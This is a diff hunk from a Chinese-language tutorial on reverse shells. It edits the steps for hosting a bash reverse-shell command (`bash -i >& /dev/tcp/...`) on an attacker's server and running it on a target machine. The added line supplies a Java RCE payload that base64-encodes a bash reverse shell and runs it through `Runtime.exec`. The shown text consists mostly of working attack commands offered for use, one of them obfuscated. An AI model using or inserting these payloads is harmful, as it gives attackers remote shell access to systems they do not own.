@@ -131,7 +131,7 @@ Bash产生了一个交互环境和本地主机主动发起与攻击机端口建�
 
 首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：
 
-`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`或者`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`
+`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`或者`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`，而java的RCE需要用base64编码，Payload:`Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");`
 
 然后在目标机上执行如下，即可反弹shell
 
